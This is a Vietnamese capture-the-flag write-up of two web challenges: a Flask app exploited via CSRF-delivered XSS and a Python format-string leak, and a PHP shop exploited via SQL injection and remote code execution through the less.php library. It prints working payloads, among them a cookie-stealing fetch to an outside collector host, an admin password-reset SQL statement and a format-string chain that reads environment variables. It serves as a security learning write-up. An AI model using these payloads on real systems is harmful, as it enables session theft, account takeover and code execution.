---
title: Pwnme Phreaks CTF 2025 write up
tags: [CTF]
slug: pwnme-phreaks-2025
date: 2024-09-03 16:46:31+0000

---

Sau một tháng lu bu việc học, việc tết, việc làm... Mình bỏ bê CTF khá lâu mà không thực sự chú tâm vào nó. Nay mình mới lật đật ngồi làm các bài tại giải pwnme phreaks,... Mình động vào 3 bài, tuy nhiên là có 1 bài blackbox mà giải end họ đóng luôn website nên đành chịu `¯\_(ツ)_/¯`. Sau đây là write up của mình với 2 chall whitebox mà mình chưa kịp sol trong thời gian giải diễn ra.
## Say My Name
Một challenge code bằng python với source code ngắn, ý tưởng khá trực quan. Vừa mở code, mình đã thấy `bot.py` (damn, lại XSS)
![image](https://hackmd.io/_uploads/B1N94yXikg.png)
### XSS with CSRF
Khi render template python để dính XSS thì ta cần có option `|safe` trong expression, mình đi tìm trong code thì chỉ có giá trị name trong `templates/yourname.html` là dính:
![image](https://hackmd.io/_uploads/HyhwIymikg.png)
Nó nằm trong một dấu nháy kép của document.location và trong tiếp thuộc tính onfocus của thẻ `<a>`
Đoạn code render template này là route `/your-name` bằng 1 POST request (thế thì report cho bot kiểu chóa gì)
```python!
def sanitize_input(input_string):
    input_string = input_string.replace('<', '')
    input_string = input_string.replace('>', '')
    input_string = input_string.replace('\'', '')
    input_string = input_string.replace('&', '')
    input_string = input_string.replace('"', '\\"')
    input_string = input_string.replace(':', '')
    return input_string

@app.route('/your-name', methods=['POST'])
def your_name():
    if request.method == 'POST':
        name = request.form.get('name')
        return Response(render_template('your-name.html', name=sanitize_input(name)), content_type='text/html')\
```
Với hàm sanitize_input, mình sẽ không thể thoát khỏi được sự kiện onfocus hay mở thẻ mới. Nên lúc này mình đã mất khá nhiều thời gian chỉ để đi tìm cách bypass, đi search mxss của firefox, xss trên firefox các kiểu để nhận ra nó không hoạt động như thế =)))
Đoạn code report và visit nó vẫn giống các chall XSS thường thấy nên mình không nhắc đến nữa, còn câu hỏi đặt ra là phải report cho con bot như nào để nó POST đến /your-name thì mình sẽ dùng CSRF.
- Mình tạo response có chứa payload CSRF cơ bản trên request repo:
```html!
<form action="http://192.168.92.187:5000/your-name" method="POST">
      <input type="hidden" name="name" value="133337" />
</form>
<script>
      document.forms[0].submit();
</script>
```
![image](https://hackmd.io/_uploads/HkZe_JQsJg.png)
- Ném cho con bot link html này là được:
![image](https://hackmd.io/_uploads/SyWd_y7ikx.png)
![image](https://hackmd.io/_uploads/rkg9_Jms1e.png)
Đã có thể đưa cho con bot payload, giờ mình sẽ tìm cách bypass XSS. Mình đã nghĩ không thể nào chèn thêm được cái gì vào cái URL kia, nên ý tưởng ban đầu của mình là trigger sự kiện onfocus bằng cách thêm fragment là id của thẻ đó vào URL ([Document](https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all)), sau đó XSS tại trang mà nó redirect sang là behindthename.com
![image](https://hackmd.io/_uploads/rkxXFkQikg.png)
Ai cũng biết là idea này không giòn tí nào, site kia không dính XSS, cũng như mình vẫn bị filter nên không điền đc payload tùy ý.
Nhìn lại filter, mình đã quên mất là nó không hề filter nháy kép mà chỉ thêm `\` vào trước, mình hoàn toàn có thể bypass bằng `\"` rồi comment đoạn đằng sau lại là có thể XSS:
![image](https://hackmd.io/_uploads/B1cpKkQjJe.png)
JS code sẽ được trigger trước khi redirect sang https://www.behindthename.com/
![image](https://hackmd.io/_uploads/rkOyqkXoJg.png)
Giờ thì chỉ cần fetch thôi, lưu ý vì chall chặn cả `:` nên khi fetch có thể bỏ `https:` đi mà chỉ cần `//URL` là được:
![image](https://hackmd.io/_uploads/r1zjn1Xo1x.png)
![image](https://hackmd.io/_uploads/HJ4ahk7ikx.png)
Giờ thì lấy token của bot thôi:
```html!
<form action="http://127.0.0.1:5000/your-name#behindthename-redirect" method="POST">
      <input type="hidden" name="name" value='1\";fetch(`//vvu7nop54qkhrr3xp05tf2qqjhp8dz1o.oastify.com/?1337=`+document.cookie)//' />
</form>
<script>
      document.forms[0].submit();
</script>
```
![image](https://hackmd.io/_uploads/SkhzJe7skl.png)
![image](https://hackmd.io/_uploads/BycDWxmo1x.png)
Mình đã có X-Admin-Token là 8657e9a9dec84afb8710a1a4a9e09efb
### Format String Python
Với X-Admin-Token, mình đã có thể truy cập được route `/admin`
```python!
def run_cmd(): # I will do that later
    pass

@app.route('/admin', methods=['GET'])
def admin():
    if request.cookies.get('X-Admin-Token') != X_Admin_Token:
        return 'Access denied', 403
    
    prompt = request.args.get('prompt')
    return render_template('admin.html', cmd=f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd))
```
- Route này nhận args từ URL là prompt, sau đó render ra giá trị cmd và format 2 lần: 1 lần với `f""` và 1 lần với `.format(run_cmd)`
- Kết quả sẽ có None bởi vì hàm run_cmd() không chạy một thứ gì cả
- Tại lần đầu tiên, nếu như ta để `{}` thì tại lần format thứ 2 thứ được thay vào là hàm run_cmd, dẫn đến việc xảy ra format string:
![image](https://hackmd.io/_uploads/H1yeXe7ikg.png)

Cộng với việc flag được để trong environment, ta confirm đây là lỗi format string vì với format string ta không thể RCE.
![image](https://hackmd.io/_uploads/r15Xmlmsyx.png)
Đầu tiên mình cứ nghĩ là sẽ không control được các attribute vì mình cần chèn vào bên format() ví dụ như `.format(run_cmd.__init__)`, nhưng mình không ngờ là có thể call trực tiếp từ bên trong phần format (kiến thức mới)
Giờ ta sẽ đi tìm chain để tiến hành leak environment, ngon nhất là `.__globals__[os].environ`, tuy nhiên tại đây thì attribute globals không có module os nên ta phải đi tìm cái khác vậy:
![image](https://hackmd.io/_uploads/rkdJNxmiye.png)
Phiên bản đẹp hơn:
```!
{
    '__name__': '__main__',
    '__doc__': None,
    '__package__': None,
    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x717c0d982220>,
    '__spec__': None,
    '__annotations__': {},
    '__builtins__': <module 'builtins' (built-in)>,
    '__file__': '/app/app.py',
    '__cached__': None,

    'Flask': <class 'flask.app.Flask'>,
    'render_template': <function render_template at 0x717c0c5c7160>,
    'request': <Request 'http://192.168.92.187:5000/admin?prompt={.__globals__}' [GET]>,
    'Response': <class 'flask.wrappers.Response'>,
    'redirect': <function redirect at 0x717c0c7591f0>,
    'url_for': <function url_for at 0x717c0c7c3f70>,
    
    'visit_report': <function visit_report at 0x717c0c58d790>,
    'token_hex': <function token_hex at 0x717c0cb6e9d0>,
    'X_Admin_Token': '8657e9a9dec84afb8710a1a4a9e09efb',
    'run_cmd': <function run_cmd at 0x717c0d9cd040>,
    'sanitize_input': <function sanitize_input at 0x717c0c2698b0>,
    
    'app': <Flask 'app'>,
    'admin': <function admin at 0x717c0c272940>,
    'index': <function index at 0x717c0c2729d0>,
    'your_name': <function your_name at 0x717c0c272b80>,
    'report': <function report at 0x717c0c272c10>
}
```
Mày mò một lúc thì mình cũng thấy từ attribute Flask có thể dẫn đến os:
![image](https://hackmd.io/_uploads/SJl24xmsye.png)
`{.__globals__[Flask].__init__.__globals__[os].environ}`
![image](https://hackmd.io/_uploads/B1c1Hx7jye.png)

## pwnshop
Một challenge PHP với lượng source khá đồ sộ so với chall phía trên, có đầy đủ các chức năng của một shop online. Mục tiêu của chúng ta là RCE:
![image](https://hackmd.io/_uploads/BJCuwrmj1g.png)
Một số folder đáng chú ý trong src:
![image](https://hackmd.io/_uploads/HyKqwHQskl.png)
- API: Chứa routing cho các api CRUD tại website và code chức năng/phân quyền sử dụng chức năng, là controller cho toàn bộ project
- Auth: Code config JWT và set cookie khi login thành công
- Models: Chứa các đối tượng và các hàm query DB với từng đối tượng
- Security: Filter file upload và XML file

### SQL Injection to Admin role
Sau khi đọc qua một lượt, mình tập trung chủ yếu vào file Api/Rest/RestController.php vì nó chứa routing và các hàm được sử dụng trong các api tương ứng. Một số hàm sẽ lấy từ Models.
Còn Security mình không để ý lắm vì đoạn code filter XML khá dài và lan man, còn file upload thì nghỉ đi vì họ whitelist rồi.
Tại route /api/orders/search sử dụng method searchOrders, ta có thể khai thác SQL Injection qua param limit:
![image](https://hackmd.io/_uploads/ryg-KBXike.png)
![image](https://hackmd.io/_uploads/S1OGFB7s1g.png)
Tại đây searchOrders gọi đến function search trong model Order, giá trị của param limit được nối vào mà không có filter gì:
![image](https://hackmd.io/_uploads/B1vTYH7j1x.png)
Không như tính năng search của model Product, param limit được ép về int trước khi nối chuỗi:
![image](https://hackmd.io/_uploads/B1Pb5HXiyg.png)
Ta hoàn toàn có thể stacked query, quá ngon:
![image](https://hackmd.io/_uploads/HyxUoHXo1x.png)
Mình lập tức nghĩ đến việc write file to RCE với into dumpfile hoặc into outfile, nhưng mình không write được. Ngồi 1 lúc thì mình thấy lí do là vì user DB không đủ quyền để write, nếu như dùng root để vào mysql bằng `mysql -u root` thì ta có thể ghi được. Còn user của ta đang là `user-pwnshop` chỉ có quyền thao tác db pwnshop chứ không có quyền FILE -> không thể đọc/ghi file:
![image](https://hackmd.io/_uploads/Hk9uZP7sJl.png)
Nhìn thấy bảng users có admin, mình đổi mật khẩu admin thành 12345678 để log in luôn:
![image](https://hackmd.io/_uploads/B16JpBQjyx.png)
![image](https://hackmd.io/_uploads/SJQQCSXoJx.png)
```sql!
update users set password = '$2y$10$sB/I2oDHtik8W2fWX3odE.FSDq9fGJ6U5HWOMfhSIhLkYMNY.0o5m' where username='admin'
```
![image](https://hackmd.io/_uploads/SJUgRSQjye.png)
Vậy là mình có Admin =))

### 0 day in less.php Library leads to RCE
Mình đã stuck ở SQLi mà không leo lên được RCE, sau đó end giải thì author có push lên solution:
![image](https://hackmd.io/_uploads/S1UIJL7s1x.png)
Oh damn, có lẽ SQLi không phải là intended. Anyways, không có cách này thì có cách khác thôi `¯\_(ツ)_/¯`
Cái mình để ý là thư viện less.php có thể trigger RCE qua file less và tên thư mục import. Tiện lợi là khi lên admin ta sẽ thấy ta có quyền config bằng cách upload less file và cấu hình import directories:
![image](https://hackmd.io/_uploads/B1MbxLXiJg.png)
Về cơ bản, khi ta tạo một thư mục để import, ta được điền vào đường dẫn vật lý và import path, các file CSS muốn import sẽ có thể sử dụng đường dẫn từ import path.
Chức năng trigger RCE nằm tại function chỉnh sửa CSS và apply CSS, với route xử lý là /api/settings/css:
![image](https://hackmd.io/_uploads/H1qfHUQsJl.png)
Đi sâu vào code, route /api/settings/css call đến method updateCustomCss tại RestController.php:
```php!
#[Privilege(permissions: [Permissions::MANAGE_APPEARANCE])]
private function updateCustomCss($currentUser, $data) {
    try {
        
        if (!isset($data['css'])) {
            return [
                'success' => false,
                'message' => 'CSS is required',
                'status' => 400
            ];
        }

        $result = $this->settings->updateCustomCss($data['css']);
        
        .....
}
```
Tiếp tục call đến method updateCustomCss -> generateCSS tại Model Settings:
```php!
public function updateCustomCss($css) {
    try {
        $customLessPath = __DIR__ . '/../../resources/less/custom.less';
        file_put_contents($customLessPath, $css);
        return $this->generateCSS();
    } catch (Exception $e) {
        return false;
    }
}

private function generateCSS() {
    try {
        $themeCssPath = __DIR__ . '/../../public/assets/css/main.css';
        $css = file_get_contents($themeCssPath);

        $customLessPath = __DIR__ . '/../../resources/less/custom.less';
        if (file_exists($customLessPath)) {
            $customLess = file_get_contents($customLessPath);
            $parser = new \Less_Parser();
            $importDirs = $this->getImportDirectories();
            $parser->SetImportDirs($importDirs);
            $parser->parse($customLess);
            $customCSS = $parser->getCss();
            $css .= "\n/* Custom CSS */\n" . $customCSS;
        }

        ....
    } catch (Exception $e) {
        return false;
    }
}
```
Tại đây Less_Parser có nhiệm vụ sử dụng import directories đã có và set vào import dir, và lấy nội dung css của chúng ta để tạo thành Css trong method getCss()
Từ đây thì chúng ta sẽ xuất hiện lỗ hổng khi sử dụng function data-uri trong Less, vốn được sử dụng để nhúng file vào CSS theo path hoặc nhúng bằng base64. Tại `Less_Tree_Call::compile` khi match thấy method data-uri sẽ set tên function là datauri và call đến method `Less_Functions::datauri`:
![image](https://hackmd.io/_uploads/SJQjjImoyg.png)
Hàm đó sẽ tiếp tục call đến `Less_FileManager::getFilePath`
![image](https://hackmd.io/_uploads/Sy2zpIXjyl.png)
Tại hàm này thì đường dẫn $rooturi được lấy từ $import_dirs được kiểm tra có phải hàm hay không, nếu có thì sẽ sử dụng như là 1 function với param là $filename là giá trị nằm trong function data-uri đã được extract từ method trước đó:
![image](https://hackmd.io/_uploads/rJ6mpLmjkg.png)
Như vậy về cơ bản, ta cần tạo một import directories có giá trị là 1 hàm nhận vào 1 tham số, cộng với việc truyền dữ liệu vào bên trong function `data-uri`, khi LESS kiểm tra tên file sẽ trigger code injection. Để RCE thì ta ưu tiên sử dụng các hàm hiển thị câu lệnh mà có khả năng nhận vào 1 tham số: system, passthru.
Mình tạo import directories có tên import path là passthru:
![image](https://hackmd.io/_uploads/Syl1C87jyx.png)
Sau đó chỉ cần trigger lỗi RCE thông qua api custom CSS là có thể RCE:
![image](https://hackmd.io/_uploads/ByAUCIQj1g.png)
Lụm flag bằng command `/getflag PWNME` 
![image](https://hackmd.io/_uploads/BJ4CC8Qj1l.png)
#### Funny Walkaround
Vì sink lỗ hổng nằm tại method `Less_FileManager::getFilePath`, tất cả các funtions call đến method này đều có thể dẫn đến RCE, quan sát trong lib/Less/Functions.php thì ngoài method datauri thì còn có method getImageSize sử dụng đến method này, cùng với tham số truyền vào tương tự:
![image](https://hackmd.io/_uploads/B1yi4wQsJe.png)
Có 3 function của less sử dụng method này, bao gồm:
- image-size: imagesize
- image-width: imagewidth
- image-height: imageheight

![image](https://hackmd.io/_uploads/Hkh0VPQjJx.png)
Nên ngoài data-uri(), ta hoàn toàn có thể sử dụng 3 function này, cách sử dụng cũng tương tự, tuy nhiên sẽ văng ra kha khá lỗi:
![image](https://hackmd.io/_uploads/rk7dHvXi1x.png)
![image](https://hackmd.io/_uploads/H17jHDmo1e.png)
